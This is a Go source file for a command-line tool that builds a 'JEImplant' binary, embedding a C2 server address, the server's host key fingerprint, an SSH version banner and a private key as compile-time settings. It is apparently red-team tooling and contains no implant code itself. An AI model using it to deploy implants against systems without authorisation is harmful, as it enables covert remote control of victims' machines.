// Program buildimplant builds an implant
package main

/*
 * buildimplant.go
 * Build an implant, with hardcoded config
 * By J. Stuart McMurray
 * Created 20220402
 * Last Modified 20220402
 */

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	ServerAddr  string
	ServerFP    string
	SSHVersion  string
	PrivKeyFile string
	SourceDir   string
)

func main() {
	start := time.Now()
	flag.StringVar(
		&ServerAddr,
		"address",
		ServerAddr,
		"C2 `address` (main.ServerAddr)",
	)
	flag.StringVar(
		&ServerFP,
		"fingerprint",
		ServerFP,
		"C2 hostkey SHA256 `fingerprint` (main.ServerFP)",
	)
	flag.StringVar(
		&SSHVersion,
		"version",
		SSHVersion,
		"SSH client version `banner` (main.SSHVersion)",
	)
	flag.StringVar(
		&PrivKeyFile,
		"key",
		PrivKeyFile,
		"Private key `file` (main.PrivKeyFile)",
	)
	flag.StringVar(
		&SourceDir,
		"source",
		SourceDir,
		"JEImplant source code `directory` (main.SourceDir)",
	)
	var (
		dryRun = flag.Bool(
			"dry-run",
			false,
			"Print the build command without building",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options] file

Builds an implant.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Make sure we have a filename to which to write. */
	if 1 != flag.NArg() {
		log.Fatalf("Need an implant filename")
	}

	/* Make sure we have a compiler. */
	o, err := exec.Command("go", "version").CombinedOutput()
	if nil != err {
		log.Fatalf("Error checking for Go compiler: %s", err)
	}
	if !bytes.HasPrefix(o, []byte("go version")) {
		log.Fatalf(
			"Unexpected output checking compiler version: %q",
			o,
		)
	}

	/* Set up the private key. */
	b, err := os.ReadFile(PrivKeyFile)
	if nil != err {
		log.Fatalf(
			"Error reading private key from %s: %s",
			PrivKeyFile,
			err,
		)
	}
	s, err := ssh.ParsePrivateKey(b)
	if nil != err {
		log.Printf(
			"Error parsing private key from %s: %s",
			PrivKeyFile,
			err,
		)
	}
	log.Printf(
		"Private key: %s -> %s",
		PrivKeyFile,
		ssh.FingerprintSHA256(s.PublicKey()),
	)
	kr := base64.StdEncoding.EncodeToString(b)

	/* Server fingerprint should be predictable. */
	if !regexp.MustCompile(
		`^SHA256:[A-Za-z0-9+/]{43}$`,
	).MatchString(ServerFP) {
		log.Fatalf("Server fingerprint %q invalid", ServerFP)
	}
	log.Printf("Server fingerprint: %s", ServerFP)

	/* Make sure the server URL is a URL. */
	u, err := url.Parse(ServerAddr)
	if nil != err {
		log.Fatalf(
			"Error parsing server address %q: %s",
			ServerAddr,
			err,
		)
	}
	switch s := strings.ToLower(u.Scheme); s {
	case "tls", "ssh": /* Good */
	default:
		log.Fatalf("Unsupported protocol %s", s)
	}
	h, p, err := net.SplitHostPort(u.Host)
	if nil != err {
		log.Fatalf("Error parsing server address %q: %s", u.Host, err)
	}
	if "" == h {
		log.Fatalf("Missing host in server address %q", ServerAddr)
	}
	if "" == p {
		log.Fatalf("Missing port in server address %q", ServerAddr)
	}
	log.Printf("Server address: %s", ServerAddr)

	/* Set up the baked-in config. */
	var lds []string
	for _, s := range [][2]string{
		{"main.ServerAddr", ServerAddr},
		{"main.ServerFP", ServerFP},
		{"main.SSHVersion", SSHVersion},
		{"main.PrivKey", kr},
	} {
		if "" == s[1] {
			continue
		}
		lds = append(lds, fmt.Sprintf("-X %s=%s", s[0], s[1]))
	}

	/* Build the implant. */
	bc := exec.Command(
		"go", "build",
		"-trimpath",
		"-ldflags", strings.Join(lds, " "),
		"-o", flag.Arg(0),
		SourceDir,
	)
	if *dryRun {
		fmt.Printf("%s\n", strings.Join(bc.Args, " "))
		return
	}
	bc.Stdout = os.Stdout
	bc.Stderr = os.Stderr
	log.Printf("Starting compile")
	if err := bc.Run(); nil != err {
		log.Fatalf("Build execution error: %s", err)
	}
	log.Printf(
		"Build finished in %s",
		time.Since(start).Round(time.Millisecond),
	)
}
